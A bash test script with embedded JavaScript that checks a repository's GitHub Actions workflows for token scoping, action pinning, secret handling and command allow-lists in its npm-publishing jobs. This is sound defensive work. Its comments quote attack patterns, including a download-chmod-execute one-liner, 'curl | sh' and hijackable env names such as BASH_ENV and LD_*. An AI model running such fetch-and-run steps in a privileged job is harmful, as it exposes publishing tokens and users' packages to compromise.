#!/usr/bin/env bash
# Workflow token and supply-chain hardening checks (#646). Needs bash and bun.
#
#   1. Every job's GITHUB_TOKEN scope is written down: each workflow either
#      declares a top-level `permissions:` or gives every job its own. A job
#      with neither inherits the REPOSITORY default, which is a setting outside
#      this tree -- read-only today (the run logs show Contents/Metadata/
#      Packages: read), but one toggle away from write on every PR run of code
#      the PR itself supplies.
#   2. The publish path holds nothing by default: release-exec.yml declares
#      `permissions: {}` at the top and every job asks for exactly what it
#      uses, so a new job starts with no token rather than inheriting write.
#   3. Every `uses:` in a workflow that holds AUTHORITY names a full 40-hex
#      commit SHA (or a local ./ path). A tag is mutable: whoever controls the
#      action's repo can move it, and the next run executes whatever it points
#      at with that workflow's token. "Authority" is derived, not listed: any
#      write scope or `id-token: write` (top level or any job), `write-all`,
#      or a `pull_request_target` trigger. A fixed list of "the publish path"
#      missed release.yml and sync-pieces-catalog.yml, whose tokens can create
#      a v* tag and dispatch a real release, and installer-release.yml, which
#      signs and publishes installers. (#984) The same holds for every
#      workflow a push or a pull request can start, whatever it holds: a PR
#      opened with RELEASE_PR_TOKEN starts its CI with no approval, on a tree
#      carrying freshly fetched upstream data, so a moved tag there runs on
#      the runner unattended. Derived the same way: any trigger other than
#      schedule and workflow_dispatch, which no push or PR can cause, counts.
#   4. The catalog sync (#686) handles third-party data -- the activepieces
#      monorepo, npm registry answers, and the dependencies whose lifecycle
#      scripts `bun install` runs -- only in jobs with no write scope and no
#      id-token, and every `bun install` is --frozen-lockfile.
#   5. A workflow that holds authority does not fetch, in the ways checked
#      here, code by a name that can move (#681): no `*version` input or env
#      that is a channel or a range, no global npm install without an exact
#      version, no `@latest`-style run, no `curl | sh`, the QEMU binfmt and
#      BuildKit images pinned by digest, and no Bun, Go cache or binfmt image
#      restored from the Actions cache (writable by any run on main), and
#      (#680) no SBOM generator image by tag. Both
#      npm publishers pin the same exact npm, no workflow sets NPM_VERSION
#      anywhere but at its top level and there only to an exact x.y.z, and an
#      npm: alias is never an exact version (#960), and every Dockerfile base image
#      is pinned by tag and digest, its Bun bases at BUN_VERSION (#783). Not
#      checked: setup-node's node-version major (runner tool cache).
#   6. Per-job authority (#682): no matrix job holds id-token (every leg would
#      get it); no `secrets: inherit`, and a local reusable workflow is passed
#      exactly the secrets it declares, which are exactly the ones it reads; a
#      job that runs `npm publish` with id-token runs no Bun and no dependency
#      install or build; (#999) no env of a job holding id-token, at any
#      level, names code to run first (BASH_ENV, ENV, PATH, NODE_OPTIONS,
#      LD_*, BASH_FUNC_*, SHELLOPTS, BASHOPTS, PS4, proxies and CAs, HOME,
#      the runner own GITHUB_*/RUNNER_*/ACTIONS_* names) or is an
#      expression, every name it sets is one these jobs already use, it has
#      no container or services, no step of it writes GITHUB_ENV or
#      GITHUB_PATH, and its shells are plain; (#1030) all of that also in a
#      job that installs npm from its checked tarball or runs npm pack,
#      whatever it holds (pack-brain); on the release path no
#      checkout leaves its token in
#      the repository config; no registry login happens on a dry run; and
#      (#781) a privileged job takes an artifact only by a digest another
#      job reported as an output, checked in the step right after the download,
#      and (#820) by no other route: not gh run download, the artifacts REST
#      API, the runtime artifact service (ACTIONS_RESULTS_URL and
#      ACTIONS_RUNTIME_TOKEN) or any other action named for artifacts,
#      downloads or the runtime. (#870) A job on the release path that reads
#      a secret other than GITHUB_TOKEN (the Apple signing secrets) is held
#      the same way: it runs no Go, cgo, compiler, make, xcrun tool but
#      notarytool and stapler, package manager, repository script or action
#      but checkout and artifact transfer, and takes artifacts by digest
#      (sha256sum, or shasum -a 256 on a macOS runner).
#   7. (#687) "Authority" also counts any use of the `secrets` context other
#      than secrets.GITHUB_TOKEN (including toJSON(secrets)), and `secrets:
#      inherit`; and every rule that reads steps descends into local
#      composite actions (./.github/actions/*), recursively, with the caller
#      inputs substituted. A local action that cannot be read, is not
#      composite, or nests too deep is reported rather than skipped. Rule 5
#      also refuses actions/cache restores where authority is held.
#   8. The catalog PR is opened with RELEASE_PR_TOKEN, never GITHUB_TOKEN, so
#      its CI runs and main's required `test` check can pass (#935); a step
#      before it refuses an empty secret; the PAT is read nowhere else; and
#      rule 4 counts a job that reads any non-GITHUB_TOKEN secret as holding
#      write, where no JavaScript runtime may run at all. (#983) The same for
#      every workflow that opens a PR with create-pull-request (the webview_go
#      bump too), and no Go build or test and no repository script runs where
#      a write scope or a secret is held either; the webview PR job takes from
#      its artifact exactly the vendored tree, hidden files included, and no
#      link and no .git (that step executed against hostile fixtures).
#   9. (#1029) The two npm publishing jobs, publish-brain and publish-sidecar,
#      and every other job holding id-token (the two Windows signers), run
#      only the commands listed for them: each run: is read as bash, every
#      command found (substitutions included) must be on the job list, the
#      ones that can fetch, write, run a program or load code only in their
#      listed text, every assignment, function call, array and for list
#      as listed, no write by redirection but to /dev/null, $GITHUB_OUTPUT
#      or another descriptor, and the list is exactly what the jobs run. A
#      job holding id-token with no list fails. See runAllow.
#  10. (#1046) In a job holding id-token, npm version and a directory npm
#      publish carry --ignore-scripts, never turned off again (lifecycle
#      scripts run otherwise), npm version carries --workspaces=false, and no
#      option comes before the npm command; publish-sidecar refuses, before
#      it sets up or runs npm, a .npmrc anywhere in its checkout, a
#      sidecar/npm that is not exactly the committed files (no link), and a
#      package.json with a field beyond its list or another name; Prepare
#      checks each package directory again where npm runs; both steps are
#      executed against hostile fixtures, setup-node never restores the npm
#      cache where authority is held, and the repository holds no .npmrc.
#  11. (#1001) No checkout in any workflow, local composite actions included,
#      leaves its token in .git/config: persist-credentials is false on every
#      one, read-only workflows too, since their later steps run PR code.
#  12. (#1047) A workflow that holds no authority and that no other workflow
#      can call may restore from the Actions cache by its exact key only, in
#      one form: a lookup-only actions/cache/restore, then actions/cache on
#      the same key and path with no restore-keys that downloads only on that
#      exact hit, then a bash step that removes every cached path (rm -rf, or
#      go clean -modcache) unless its own hit is exact. So a prefix match is
#      not extracted unless the exact entry is evicted or deleted between the
#      first two steps. Nor may the env that reaches the discard, written in
#      the YAML or to GITHUB_ENV/GITHUB_PATH by an earlier step, change what
#      it runs (what actions write there is not read).
#      Not stopped: an entry written at the exact key before CI wrote it.
#      The toolchain caches of setup-bun, setup-go and setup-node take any
#      prefix match of their key, so they stay refused in every workflow
#      rule 5 reads.
#  13. (#1048) Rule 5 reads every workflow rule 3 does: authority or reach.
#      Every container:, services: and docker:// image in every workflow is
#      pinned by digest. Not checked: the BuildKit layer cache docker-build
#      reads with cache-from type=gha, whose index is the latest any run
#      on main wrote, not an exact key.
#
# Each rule is also run against a mutated copy that breaks it, and must report
# it, so a neutered check fails here instead of passing everything.
#
# Run from anywhere:  .github/scripts/workflow-hardening.test.sh
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKFLOWS="${WORKFLOW_DIR:-${HERE}/../workflows}"

pass=0
fail=0
ok() {
	pass=$((pass + 1))
	echo "  ok   - $1"
}
no() {
	fail=$((fail + 1))
	echo "  FAIL - $1"
	[ -n "${2:-}" ] && printf '%s\n' "$2" | sed 's/^/         /'
}

command -v bun >/dev/null || {
	echo "bun is required (Bun.YAML)" >&2
	exit 1
}
WORK="$(mktemp -d)" || exit 1
trap 'rm -rf "$WORK"' EXIT

# check <rule> <file>: one violation per line, nothing when clean.
#   rule = scoped | publish-perms | pinned | authority | reach | untrusted
#          | mutable | narrow | pushcache | opens-pr | catalog-pr | npmpin
#          | runs | persist | images
check() {
	# Written to a file once and run from there, not handed to bun -e: the
	# source outgrew the 128 KiB Linux allows a single argument
	# (MAX_ARG_STRLEN; 131770 bytes in the #870 review, when execve refused
	# it and every rule failed). printf is a builtin, so no exec limit applies.
	if [ ! -s "${WORK}/check.mjs" ]; then
		# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
		printf '%s' '
const doc = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const jobs = doc.jobs ?? {};
const out = [];
const rule = process.env.RULE;
// The steps of a job, with every local composite action expanded in place (#687),
// recursively: a workflow that pins everything it names can otherwise reach
// unpinned code one level down. In a composite step, ${{ inputs.X }} is
// replaced by what the caller passes, or by the input default.
// penv: the env of the steps that use the enclosing local actions, which
// GitHub hands down to the steps inside them (#1047 review 3).
const flatSteps = (steps, via = "", depth = 0, penv = {}) => {
  const outSteps = [];
  for (const st of steps ?? []) {
    outSteps.push({ st, via, penv });
    const u = String(st.uses ?? "");
    if (!u.startsWith("./") || /\.ya?ml$/.test(u)) continue;
    // Every rule that reads steps would otherwise pass what it cannot see.
    if (depth > 4) { out.push(via + u + ": local actions nested too deep to check"); continue; }
    let action = null;
    for (const f of ["action.yml", "action.yaml"])
      try { action = Bun.YAML.parse(require("node:fs").readFileSync(process.env.REPO + "/" + u.slice(2).replace(/\/$/, "") + "/" + f, "utf8")); break; } catch {}
    if (!action) { out.push(via + u + ": local action cannot be read, so it cannot be checked"); continue; }
    if (action.runs?.using !== "composite") { out.push(via + u + ": local " + action.runs?.using + " action, which this test cannot look inside"); continue; }
    // Input names are case-insensitive to GitHub.
    const inputs = new Map();
    for (const [k, v] of Object.entries(action.inputs ?? {})) inputs.set(k.toLowerCase(), v?.default ?? "");
    for (const [k, v] of Object.entries(st.with ?? {})) inputs.set(k.toLowerCase(), v);
    const fill = (x) => JSON.parse(JSON.stringify(x).replace(/\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}/g,
      (m, k) => inputs.has(k.toLowerCase()) ? JSON.stringify(String(inputs.get(k.toLowerCase()))).slice(1, -1) : m));
    outSteps.push(...flatSteps(action.runs.steps.map(fill), via + u + " > ", depth + 1, { ...penv, ...(st.env ?? {}) }));
  }
  return outSteps;
};
// shRead(src): the simple commands of a bash script, as this rule reads them.
// Returns { cmds: [{ name, words, redirs, assigns }], funcs, arrays, unread }.
// A substitution ($( ), backticks, <( ), >( )) is read as a script of its own
// wherever it sits, in a word, a [[ ]], a case pattern or a for list, so the
// commands inside always count. Anything outside the subset read here is
// listed in unread, and the rule refuses it rather than guess.
const shRead = (src) => {
  const cmds = [], funcs = [], arrays = [], fors = [], unread = [];
  const n = src.length;
  let i = 0;
  const sp = (c) => c === " " || c === "\t";
  const take = (r) => { cmds.push(...r.cmds); funcs.push(...r.funcs); arrays.push(...r.arrays); fors.push(...r.fors); unread.push(...r.unread); };
  // From just after an opener to its closer; the inside read as a script.
  const sub = (closer) => {
    const start = i;
    let depth = 0, q = "";
    for (; i < n; i++) {
      const c = src[i];
      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
      if (c === "\\") { i++; continue; }
      if (q === "\"") { if (c === "\"") q = ""; continue; }
      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
      if (c === "\x27" || c === "\"") { q = c; continue; }
      if (c === "#" && closer === ")" && (i === start || /[\s;&|(]/.test(src[i - 1]))) { unread.push("a comment inside a substitution"); continue; }
      if (closer === "`") { if (c === "`") break; continue; }
      if (c === "(") depth++;
      else if (c === ")") { if (depth === 0) break; depth--; }
    }
    if (i >= n) { unread.push("an unclosed substitution"); return; }
    take(shRead(src.slice(start, i)));
    i++;
  };
  // ${...}: only the forms that evaluate no arithmetic and take no subscript
  // but a literal one.
  const param = () => {
    const start = i;
    let depth = 1, q = "";
    for (; i < n; i++) {
      const c = src[i];
      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
      if (c === "\\") { i++; continue; }
      if (c === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
      if (c === "`") { i++; sub("`"); i--; continue; }
      if (q === "\"") { if (c === "\"") q = ""; continue; }
      if (c === "\x27" || c === "\"") { q = c; continue; }
      if (c === "{") depth++;
      else if (c === "}" && --depth === 0) break;
    }
    if (i >= n) { unread.push("an unclosed ${"); return; }
    const body = src.slice(start, i);
    i++;
    const m = /^#?(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[@*#?$!-])(?:\[(?:[0-9]+|@|\*)\])?([\s\S]*)$/.exec(body);
    if (!m || (m[1] !== "" && !/^(?::?[-=+?]|##?|%%?|\/\/?)/.test(m[1])))
      unread.push("the parameter expansion ${" + body + "} (a subscript, a substring or an indirection)");
  };
  // One word, as written, quotes kept.
  const word = () => {
    const start = i;
    let q = "";
    for (; i < n; i++) {
      const c = src[i];
      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
      if (c === "\\") { i++; continue; }
      if (c === "$" && src.startsWith("((", i + 1)) { unread.push("an arithmetic expansion"); i += 2; continue; }
      if (c === "$" && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
      if (c === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
      if (c === "`") { i++; sub("`"); i--; continue; }
      if (q === "\"") { if (c === "\"") q = ""; continue; }
      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
      if (c === "\x27" || c === "\"") { q = c; continue; }
      if ((c === "<" || c === ">") && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
      if (c === "=" && src[i + 1] === "(" && /^[A-Za-z_][A-Za-z0-9_]*\+?$/.test(src.slice(start, i))) {
        // An array literal: NAME=( ... ) or NAME+=( ... ), its items kept.
        const name = src.slice(start, i).replace(/\+$/, "");
        i += 2;
        const at = i;
        let depth = 0;
        for (; i < n && !(src[i] === ")" && depth === 0); i++) {
          if (src[i] === "(") depth++;
          else if (src[i] === ")") depth--;
          else if (/[$`\x27"\\]/.test(src[i])) unread.push("an array literal holding quotes or expansions");
        }
        arrays.push({ name, items: src.slice(at, i).trim().split(/\s+/).filter(Boolean) });
        continue;
      }
      if (sp(c) || c === "\n" || ";&|()<>".includes(c)) break;
    }
    if (q) unread.push("an unclosed quote");
    return src.slice(start, i);
  };
  const toks = [];
  while (i < n) {
    const c = src[i];
    if (sp(c)) { i++; continue; }
    if (c === "\\" && src[i + 1] === "\n") { i += 2; continue; }
    if (c === "#") { while (i < n && src[i] !== "\n") i++; continue; }
    if (c === "\n") { toks.push({ op: ";" }); i++; continue; }
    const two = src.slice(i, i + 2), three = src.slice(i, i + 3);
    if (three === "<<<" || three === "&>>" || three === ";;&") { toks.push({ op: three }); i += 3; continue; }
    if (two === "<<") { unread.push("a heredoc"); i += 2; continue; }
    if (two === "((") { unread.push("an arithmetic command"); i += 2; continue; }
    if ((c === "<" || c === ">") && src[i + 1] === "(") { toks.push({ w: word() }); continue; }
    if (["&&", "||", ";;", ";&", "|&", ">>", ">&", "<&", "&>", ">|", "<>"].includes(two)) { toks.push({ op: two }); i += 2; continue; }
    if (";&|()<>".includes(c)) { toks.push({ op: c }); i++; continue; }
    if (two === "[[" && (i + 2 >= n || sp(src[i + 2]))) {
      // Read whole: a regex there holds ( ) | unquoted.
      i += 2;
      const start = i;
      let q = "";
      for (; i < n; i++) {
        const d = src[i];
        if (q === "\x27") { if (d === "\x27") q = ""; continue; }
        if (q === "a") { if (d === "\\") i++; else if (d === "\x27") q = ""; continue; }
        if (d === "\\") { i++; continue; }
        if (d === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
        if (d === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
        if (d === "`") { i++; sub("`"); i--; continue; }
        if (q === "\"") { if (d === "\"") q = ""; continue; }
        if (d === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
        if (d === "\x27" || d === "\"") { q = d; continue; }
        if (d === "\n") { unread.push("a [[ ]] across lines"); break; }
        if (d === "]" && src[i + 1] === "]" && sp(src[i - 1]) && (i + 2 >= n || /[\s;&|)]/.test(src[i + 2]))) break;
      }
      if (i >= n || src[i] !== "]") unread.push("an unclosed [[");
      const body = src.slice(start, i);
      // An integer comparison there evaluates its operands as arithmetic,
      // which runs a $( ) that an operand only spells, even quoted.
      if (/(?:^|\s)-(?:eq|ne|lt|le|gt|ge)(?=\s|$)/.test(body)) unread.push("an integer comparison inside [[ ]]");
      toks.push({ cond: body });
      i += 2;
      continue;
    }
    const fd = /^[0-9]+(?=[<>])/.exec(src.slice(i, i + 4));
    if (fd) { i += fd[0].length; continue; }
    toks.push({ w: word() });
  }
  // Commands from the tokens.
  const reserved = new Set(["if", "then", "elif", "else", "fi", "do", "done", "while", "until", "!", "{", "}"]);
  const refused = new Set(["select", "coproc", "time", "function", "let", "in", "esac", "[[", "]]", "eval", "source", "."]);
  const sep = new Set([";", "&", "&&", "||", "|", "|&", "(", ")"]);
  const redirOps = new Set([">", ">>", ">|", "&>", "&>>", "<>", ">&", "<", "<<<", "<&"]);
  const cases = [];
  let t = 0;
  while (t < toks.length) {
    const k = toks[t];
    const top = cases[cases.length - 1];
    if (top === "pattern") {
      if (k.op === ";") { t++; continue; }
      if (k.w === "esac") { cases.pop(); t++; continue; }
      if (k.op === "(") t++;
      while (t < toks.length && toks[t].op !== ")") t++;
      t++;
      cases[cases.length - 1] = "body";
      continue;
    }
    if (top === "body" && (k.op === ";;" || k.op === ";&" || k.op === ";;&")) { cases[cases.length - 1] = "pattern"; t++; continue; }
    if (top === "body" && k.w === "esac") { cases.pop(); t++; continue; }
    if (k.op && sep.has(k.op)) { t++; continue; }
    if (k.op === ";;" || k.op === ";&" || k.op === ";;&") { unread.push("a case terminator outside a case"); t++; continue; }
    if (k.cond !== undefined) { t++; continue; }
    if (k.w !== undefined && reserved.has(k.w)) { t++; continue; }
    if (k.w === "for") {
      if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(toks[t + 1]?.w ?? "") || toks[t + 2]?.w !== "in") { unread.push("a for loop of another shape"); t++; continue; }
      const v = toks[t + 1].w;
      t += 3;
      const items = [];
      while (t < toks.length && toks[t].op !== ";") { if (toks[t].w === undefined) unread.push("a for list holding an operator"); else items.push(toks[t].w); t++; }
      fors.push({ v, items });
      continue;
    }
    if (k.w === "case") {
      if (toks[t + 1]?.w === undefined || toks[t + 2]?.w !== "in") { unread.push("a case of another shape"); t++; continue; }
      cases.push("pattern");
      t += 3;
      continue;
    }
    if (k.w !== undefined && toks[t + 1]?.op === "(" && toks[t + 2]?.op === ")") { funcs.push(k.w); t += 3; continue; }
    // A simple command: assignments, redirections, then a name and words.
    const c = { name: null, words: [], redirs: [], assigns: [] };
    while (t < toks.length && !(toks[t].op && (sep.has(toks[t].op) || toks[t].op.startsWith(";")))) {
      const x = toks[t];
      if (top === "body" && x.w === "esac" && c.name === null) break;
      if (x.op && redirOps.has(x.op)) {
        if (toks[t + 1]?.w === undefined) unread.push("a redirection with no target");
        c.redirs.push({ op: x.op, target: toks[t + 1]?.w ?? "" });
        t += 2;
        continue;
      }
      if (x.cond !== undefined) { unread.push("a [[ ]] inside a command"); t++; continue; }
      if (x.op) { unread.push("the operator " + x.op); t++; continue; }
      if (c.name === null && /^[A-Za-z_][A-Za-z0-9_]*\+?=/.test(x.w)) { c.assigns.push(x.w); t++; continue; }
      if (c.name === null && refused.has(x.w)) unread.push("the shell word " + x.w);
      if (c.name === null) c.name = x.w; else c.words.push(x.w);
      t++;
    }
    // A bare assignment is kept too: its value reaches the commands after it.
    if (c.name !== null || c.redirs.length || c.assigns.length) cmds.push(c);
  }
  if (cases.length) unread.push("an unclosed case");
  return { cmds, funcs, arrays, fors, unread };
};
if (rule === "runs") {
  // #870 review: and so are those of the two macOS signers, which hold the
  // long-lived Apple signing secrets (sign-sidecar-darwin, sign-macos). A
  // job that reads them has to have a list here, like one holding id-token,
  // and may also write by redirection to the files named in its writes.
  //
  // #1029: the commands the two npm publishing jobs run are listed, not the
  // ones they must not run, and (security review of #1029) so are those of
  // every other job holding id-token: today the two Windows signers, which
  // federate into the KMS signing key. narrow refuses runtimes and package managers,
  // and that list could never be complete: `curl -o /tmp/x URL; chmod +x
  // /tmp/x; /tmp/x` passed it in the one job that mints an npm publish
  // token. Here a new command in either job fails until it is added below,
  // with a reason, the way their uses: and their env names (knownEnv) are.
  //
  // How a command is identified. Each run: is read as bash by shRead: words
  // and quotes as bash splits them; commands split at newlines, ; & && ||
  // | |& and ( ), and found after if then elif else while until do ! { };
  // assignments in front skipped; the patterns of a case and the list of a
  // for read as data; and every $( ), backtick, <( ) and >( ), wherever it
  // sits (in a word, a quote, a [[ ]], a pattern, a for list, an array
  // subscript), read as a script of its own, so a command inside one is a
  // command. The name is the first word after that. A construct shRead does
  // not read (a heredoc, arithmetic, an integer test in [[ ]], a subscript
  // or substring that evaluates arithmetic, select, coproc, time, eval,
  // source, a comment inside a substitution) is refused rather than guessed.
  //
  // Then, for each command:
  //   - its name is a plain word (not a path, not an expansion) unless it is
  //     a listed form (scripts/sign-windows.sh, whose own text is repository
  //     content, like the package.json scripts below), so nothing
  //     downloaded or written can be run by its path, and is on the list:
  //     free (any arguments: it can neither fetch, write a file it is given,
  //     run another program nor load code by an option) or pinned (its whole
  //     text, name and words as written, is one of the listed forms: curl
  //     fetches and writes, openssl loads engines, tar and cp and tee write,
  //     sed and find and xargs and sort run programs, npm and set and export
  //     and cd change what runs next). Without the pin, curl -o over the npm
  //     on PATH, then the allowed npm publish, is the same attack;
  //   - nothing is put in front of it but LC_ALL=C;
  //   - it writes by redirection only to /dev/null, $GITHUB_OUTPUT or
  //     another descriptor;
  //   - printf takes no -v, which assigns a variable unseen.
  // Functions are listed too, may not take the name of a command, and are
  // called only in the step that defines them (a binary of that name, expect
  // for one, may be on PATH), and each call only as listed, since its
  // arguments reach the forms inside it. Every assignment (a bare one, as
  // written), array literal and for list is listed too, since their values
  // reach the pinned forms (review of #1029: a VERSION reassigned before the
  // pinned sed -i would hand sed a script of its own, and GNU sed scripts
  // run commands).
  // And the list is exactly what the jobs run: an entry no step uses is
  // reported, so nothing stays allowed after the step that needed it went.
  //
  // Not covered: the values a step takes from its env: (job outputs and
  // inputs, which the scripts check before use, #684, #781) and from the
  // runner reach the listed forms as they come; a redirection to
  // "$GITHUB_OUTPUT" is matched as that text, which holds because narrow
  // refuses any GITHUB_* name being set. npm would run the lifecycle scripts
  // of the package.json in a directory it publishes or versions
  // (publish-sidecar), which is repository content, not run: text: narrow
  // requires --ignore-scripts on those calls, and publish-sidecar refuses a
  // .npmrc or a package.json field beyond its list before npm runs (#1046).
  const runAllow = {
    "publish-brain": {
      free: ["[", "base64", "echo", "exit", "sha256sum"],
      pinned: {
        curl: [
          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
        ],
        mktemp: [
          "mktemp -d /tmp/npm.XXXXXXXXXX",
        ],
        npm: [
          "npm --version",
          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
          "npm publish \"${RUNNER_TEMP}/brain-pack/${TARBALL}\" --access public \"${flags[@]}\"",
          "npm view \"${pkg}@${VERSION}\" version",
        ],
        openssl: [
          "openssl dgst -sha512 -binary \"$npm_tgz\"",
        ],
        set: [
          "set -euo pipefail",
        ],
      },
      funcs: [],
      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
      fors: [],
      calls: [
      ],
      assigns: [
        "got=\"$(npm --version)\"",
        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
        "pkg=\"@usejarvis/brain\"",
      ],
    },
    "publish-sidecar": {
      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "tr", "true"],
      pinned: {
        cd: [
          "cd \"$GITHUB_WORKSPACE\"",
          "cd \"${pkg_dir}\"",
          "cd \"sidecar/npm/${platform}\"",
          "cd -P \"$1\"",
          "cd artifacts",
          "cd sidecar/npm/jarvis-sidecar",
        ],
        chmod: [
          "chmod +x \"${pkg_dir}/bin/\"*",
        ],
        cp: [
          "cp \"artifacts/sidecar-${platform}/\"* \"${pkg_dir}/bin/\"",
        ],
        curl: [
          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
          "curl -fsSL --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 268435456 -o \"${tmp}/npm.tgz\" \"$url\"",
        ],
        diff: [
          "diff <(printf \x27%s\\n\x27 \"$ours\") <(printf \x27%s\\n\x27 \"$theirs\")",
          "diff <(printf \x27%s\\n\x27 \"$want\") <(printf \x27%s\\n\x27 \"$got\")",
        ],
        export: [
          "export LC_ALL=C",
        ],
        find: [
          "find \"${tmp}/x\" -mindepth 1 -maxdepth 1 -printf \x27%P %y\\n\x27",
          "find . -mindepth 1 -not -type d",
          "find . -name .npmrc -print -quit",
          "find \"${pkg_dir}\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27",
          "find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27",
          "find . -mindepth 1 -not -type d -not -type f -print -quit",
          "find . -mindepth 1 -not -type d -printf \x27%y %P\\n\x27",
          "find . -name \x27*[![:print:]]*\x27 -print -quit",
          "find . -type f -print0",
          "find bin -type f -print -quit",
        ],
        jq: [
          "jq -e \x27type == \"object\" and (keys - [\"bin\", \"description\", \"files\", \"name\", \"optionalDependencies\", \"repository\", \"version\"] == []) and .name == \"@usejarvis/sidecar\" and .files == [\"bin\"] and .bin == {\"jarvis\": \"bin/jarvis\"} and (.optionalDependencies | type == \"object\" and keys == [\"@usejarvis/sidecar-darwin-arm64\", \"@usejarvis/sidecar-darwin-x64\", \"@usejarvis/sidecar-linux-arm64\", \"@usejarvis/sidecar-linux-x64\", \"@usejarvis/sidecar-win32-x64\"] and all(.[]; type == \"string\" and test(\"\\\\A[0-9]+\\\\.[0-9]+\\\\.[0-9]+\\\\z\")))\x27 sidecar/npm/jarvis-sidecar/package.json",
          "jq -e --arg v \"$VERSION\" \x27[.optionalDependencies[]] | length == 5 and all(. == $v)\x27 package.json",
          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"${pkg_dir}/package.json\"",
          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"sidecar/npm/${platform}/package.json\"",
        ],
        local: [
          "local url integrity tmp got names types ours theirs",
        ],
        mktemp: [
          "mktemp",
          "mktemp -d",
          "mktemp -d /tmp/npm.XXXXXXXXXX",
        ],
        npm: [
          "npm --version",
          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
          "npm publish --access public --ignore-scripts \"${flags[@]}\"",
          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false",
          "npm view \"${1}@${VERSION}\" dist.integrity",
          "npm view \"${1}@${VERSION}\" dist.tarball",
          "npm view \"${pkg}@${VERSION}\" version",
        ],
        openssl: [
          "openssl dgst -sha512 -binary \"$npm_tgz\"",
          "openssl dgst -sha512 -binary \"${tmp}/npm.tgz\"",
        ],
        sed: [
          "sed \x27s|^\\./||\x27",
          "sed -i \"s|\\\"@usejarvis/sidecar-${platform}\\\": \\\".*\\\"|\\\"@usejarvis/sidecar-${platform}\\\": \\\"${VERSION}\\\"|\" package.json",
        ],
        set: [
          "set -euo pipefail",
          "set -o pipefail",
        ],
        sort: [
          "sort",
          "sort -z",
        ],
        tar: [
          "tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\"",
          "tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\"",
          "tar -xzf \"${tmp}/npm.tgz\" -C \"${tmp}/x\" --no-same-owner --no-same-permissions",
          "tar -xzf \"artifacts/sidecar-${platform}/jarvis-app.tar.gz\" -C \"${pkg_dir}/bin/\"",
        ],
        tee: [
          "tee \"$err\"",
        ],
        xargs: [
          "xargs -0 -r sha256sum",
          "xargs -0 sha256sum",
        ],
      },
      funcs: ["expect", "manifest", "same_as_npm"],
      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
      fors: ["platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64"],
      calls: [
        "expect \"$SHA_DARWIN_ARM64\" \"sidecar-darwin-arm64/jarvis-app.tar.gz\"",
        "expect \"$SHA_DARWIN_X64\" \"sidecar-darwin-x64/jarvis-app.tar.gz\"",
        "expect \"$SHA_LINUX_ARM64\" \"sidecar-linux-arm64/${SIDECAR_BIN}\"",
        "expect \"$SHA_LINUX_X64\" \"sidecar-linux-x64/${SIDECAR_BIN}\"",
        "expect \"$SHA_WIN32_X64\" \"sidecar-win32-x64/${SIDECAR_BIN}.exe\"",
        "manifest \"${tmp}/x/package\"",
        "manifest .",
        "same_as_npm \"$pkg\"",
      ],
      assigns: [
        "SHA_DARWIN_ARM64=\"${BASH_REMATCH[3]}\"",
        "SHA_DARWIN_X64=\"${BASH_REMATCH[4]}\"",
        "SHA_LINUX_ARM64=\"${BASH_REMATCH[2]}\"",
        "SHA_LINUX_X64=\"${BASH_REMATCH[1]}\"",
        "SHA_WIN32_X64=\"${BASH_REMATCH[5]}\"",
        "VERSION=\"${BUILT_VERSION:-}\"",
        "VERSION=\"${GIVEN_VERSION:-}\"",
        "err=\"$(mktemp)\"",
        "got=\"$(find . -mindepth 1 -not -type d | sed \x27s|^\\./||\x27 | sort)\"",
        "got=\"$(npm --version)\"",
        "got=\"$(openssl dgst -sha512 -binary \"${tmp}/npm.tgz\" | base64 -w0)\"",
